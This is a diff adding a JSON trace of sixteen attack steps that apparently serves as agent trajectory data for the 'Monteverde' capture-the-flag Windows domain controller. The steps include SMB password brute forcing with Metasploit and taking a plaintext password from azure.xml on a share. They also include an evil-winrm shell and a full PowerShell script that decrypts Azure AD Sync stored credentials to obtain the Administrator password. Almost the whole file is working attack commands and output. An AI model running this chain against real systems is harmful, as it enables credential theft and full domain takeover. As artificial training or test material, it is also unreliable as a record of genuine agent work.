@@ -1,0 +1,101 @@
+{
+    "initial_prompt": "Exploit the 'Monteverde' machine (Windows, IP: 10.10.10.172, Active Directory environment) to gain full control and retrieve user.txt and root.txt flags. Attacker machine: Kali Linux 2024.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Identify open ports and services running on the target machine to establish an attack surface.",
+            "command": "nmap -sV --top-ports 5000 10.10.10.172",
+            "result": "Nmap scan reveals open ports: 53 (DNS - Microsoft DNS), 88 (Kerberos - Microsoft Kerberos), 135 (RPC - Microsoft RPC), 139/445 (SMB - Microsoft SMB), 389 (LDAP - Microsoft LDAP), 5985 (WinRM - Windows Remote Management). This indicates a Windows domain controller with Active Directory services."
+        },
+        {
+            "step_number": 2,
+            "thought": "Enumerate the SMB service to gather domain and user information.",
+            "command": "enum4linux -a 10.10.10.172",
+            "result": "Enum4linux discovers Domain: `MEGABANK.LOCAL`, Hostname: `MONTEVERDE`, and Users: `Administrator`, `Guest`, `AAD_987d7f2f57d2`, `SABatchJobs`, `svc-ata`, `svc-netapp`, `dgalanos`, `roleary`, `smorgan`, `mhope`."
+        },
+        {
+            "step_number": 3,
+            "thought": "Prepare a user list file from enumerated users for credential brute-force attack.",
+            "command": "echo -e \"Administrator\\nGuest\\nAAD_987d7f2f57d2\\nSABatchJobs\\nsvc-ata\\nsvc-netapp\\ndgalanos\\nroleary\\nsmorgan\\nmhope\" > users.txt",
+            "result": "File `users.txt` created locally on the attacker's machine, containing one username per line, for use in subsequent brute-force attacks."
+        },
+        {
+            "step_number": 4,
+            "thought": "Perform a brute-force attack on SMB using usernames as passwords to find weak credentials.",
+            "command": "msfconsole -q -x \"use auxiliary/scanner/smb/smb_login; set USER_FILE users.txt; set PASS_FILE users.txt; set RHOSTS 10.10.10.172; set VERBOSE false; run; exit\"",
+            "result": "Metasploit's `smb_login` module successfully logs in with Username: `SABatchJobs`, Password: `SABatchJobs`."
+        },
+        {
+            "step_number": 5,
+            "thought": "List accessible SMB shares using the discovered `SABatchJobs` credentials.",
+            "command": "smbclient -L //10.10.10.172 -U \"SABatchJobs%SABatchJobs\"",
+            "result": "Available SMB shares are listed: `ADMIN$`, `azure_uploads`, `C$`, `E$`, `IPC$`, `NETLOGON`, `SYSVOL`, `users$`. The `users$` share is a promising target for further investigation."
+        },
+        {
+            "step_number": 6,
+            "thought": "Explore the `users$` share, specifically the `mhope` directory, to find potentially sensitive files.",
+            "command": "smbclient //10.10.10.172/users$ -U \"SABatchJobs%SABatchJobs\" -c \"cd mhope; ls\"",
+            "result": "Connected to `users$` share. Listing contents of the `mhope` directory reveals a file named `azure.xml` among other files and directories."
+        },
+        {
+            "step_number": 7,
+            "thought": "Download the `azure.xml` file from the `mhope` directory for local analysis.",
+            "command": "smbclient //10.10.10.172/users$ -U \"SABatchJobs%SABatchJobs\" -c \"cd mhope; get azure.xml\"",
+            "result": "The file `azure.xml` is downloaded from `//10.10.10.172/users$/mhope/` to the current local directory on the attacker's machine."
+        },
+        {
+            "step_number": 8,
+            "thought": "Examine the downloaded `azure.xml` file to extract credentials.",
+            "command": "cat azure.xml",
+            "result": "Contents of `azure.xml` are displayed. The XML data contains a `<password>` tag with the value `4n0therD4y@n0th3r$`, associated with user `mhope`."
+        },
+        {
+            "step_number": 9,
+            "thought": "Use the extracted credentials for `mhope` to gain access via WinRM.",
+            "command": "evil-winrm -i 10.10.10.172 -u mhope -p \"4n0therD4y@n0th3r$\"",
+            "result": "Successfully connected to WinRM as `mhope@MEGABANK.LOCAL`. A PowerShell prompt `*Evil-WinRM* PS C:\\Users\\mhope\\Documents>` is obtained, indicating a successful interactive session."
+        },
+        {
+            "step_number": 10,
+            "thought": "Verify the current user context within the WinRM shell.",
+            "command": "whoami",
+            "result": "Output within the Evil-WinRM shell: `megabank\\mhope`. This confirms the current user context is `mhope` within the `megabank` domain."
+        },
+        {
+            "step_number": 11,
+            "thought": "Navigate to `mhope`'s Desktop and retrieve the user flag.",
+            "command": "cd C:\\Users\\mhope\\Desktop; type user.txt",
+            "result": "Changed directory to `C:\\Users\\mhope\\Desktop` within the Evil-WinRM shell. The contents of `user.txt` (e.g., a 32-character hexadecimal string like `d0c3...`) are displayed. User flag obtained."
+        },
+        {
+            "step_number": 12,
+            "thought": "Check `mhope`'s group memberships for potential privilege escalation vectors, particularly related to Azure AD Connect.",
+            "command": "whoami /all",
+            "result": "Output within the Evil-WinRM shell displays detailed user information including SIDs and group memberships. This information (e.g., membership in Azure-related administrative groups) can justify the ability to query the ADSync database."
+        },
+        {
+            "step_number": 13,
+            "thought": "Enumerate installed software to confirm presence of Azure AD Connect, a known vector for credential dumping.",
+            "command": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | Select-Object DisplayName",
+            "result": "Output within the Evil-WinRM shell lists installed software. `Microsoft Azure AD Sync` is present in the list, confirming a potential attack vector for credential extraction."
+        },
+        {
+            "step_number": 14,
+            "thought": "Execute PowerShell script within the `mhope` WinRM session to extract credentials from Azure AD Sync configuration database.",
+            "command": "$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \"Server=monteverde;Database=ADSync;Integrated Security=true\"; $client.Open(); $cmd = $client.CreateCommand(); $cmd.CommandText = \"SELECT * FROM mms_server_configuration\"; $reader = $cmd.ExecuteReader(); $reader.Read(); $key_id = $reader.GetInt32(0); $instance_id = $reader.GetGuid(1); $entropy = $reader.GetGuid(2); $reader.Close(); $cmd = $client.CreateCommand(); $cmd.CommandText = \"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'\"; $reader = $cmd.ExecuteReader(); $reader.Read(); $config = $reader.GetString(0); $crypted = $reader.GetString(1); $reader.close(); add-type -path 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager; $km.LoadKeySet($entropy, $instance_id, $key_id); $key = $null; $km.GetActiveCredentialKey([ref]$key); $key2 = $null; $km.GetKey(1, [ref]$key2); $decrypted = $null; $key2.DecryptBase64ToString($crypted, [ref]$decrypted); $decrypted",
+            "result": "The PowerShell script executes successfully within the Evil-WinRM shell. It connects to the ADSync database, retrieves encrypted data, and decrypts it, revealing the Administrator password: `d0ntLetThese4dG1n$ControlU$`."
+        },
+        {
+            "step_number": 15,
+            "thought": "Exit the current `mhope` WinRM session and use the extracted Administrator credentials to gain an elevated WinRM shell.",
+            "command": "evil-winrm -i 10.10.10.172 -u Administrator -p \"d0ntLetThese4dG1n$ControlU$\"",
+            "result": "After exiting the previous `mhope` session (by typing `exit` in that shell or opening a new terminal), this command connects to WinRM as `Administrator@MEGABANK.LOCAL`. A PowerShell prompt `*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>` is obtained."
+        },
+        {
+            "step_number": 16,
+            "thought": "Navigate to Administrator's Desktop and retrieve the root flag.",
+            "command": "cd C:\\Users\\Administrator\\Desktop; type root.txt",
+            "result": "Changed directory to `C:\\Users\\Administrator\\Desktop` within the Administrator's Evil-WinRM shell. The contents of `root.txt` (e.g., a 32-character hexadecimal string like `a4f3...`) are displayed. Root flag obtained, completing the challenge."
+        }
+    ]
+}
